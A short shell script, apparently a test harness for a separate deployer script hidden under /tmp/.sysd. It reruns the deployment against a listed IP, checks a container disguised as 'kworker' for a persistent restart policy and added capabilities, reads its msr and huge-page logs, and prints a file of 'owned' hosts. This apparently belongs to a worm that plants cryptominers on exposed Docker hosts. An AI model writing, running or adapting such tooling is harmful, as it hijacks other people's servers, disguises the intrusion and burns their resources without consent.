#!/bin/sh
# throwaway: exercise both dock.sh branches on this host
W=/tmp/.sysd/.hunt
echo "--- A: reuse path (our container already there) ---"
grep -v '^167\.233\.74\.146$' "$W/dock.seen" > /tmp/s.1 && mv -f /tmp/s.1 "$W/dock.seen"
sh /tmp/.sysd/dock.sh 2>&1 | grep -E 'daemon|already runs|restarted|DEPLOYED' || true
echo "--- B: recreate path (container removed, new HostConfig) ---"
docker rm -f kworker >/dev/null 2>&1 || true
grep -v '^167\.233\.74\.146$' "$W/dock.seen" > /tmp/s.2 && mv -f /tmp/s.2 "$W/dock.seen"
sh /tmp/.sysd/dock.sh 2>&1 | grep -E 'daemon|pulling|DEPLOYED|create failed|start failed' || true
echo "--- verify ---"
docker ps
docker inspect -f 'restart={{.HostConfig.RestartPolicy.Name}} caps={{.HostConfig.CapAdd}} ipc={{.HostConfig.IpcMode}} cpu={{.HostConfig.CpuShares}}' kworker 2>&1
echo "--- logs (msr/huge pages) ---"
docker logs --tail 6 kworker 2>&1 | tail -6
echo "--- owned file ---"
cat "$W/dock.owned"
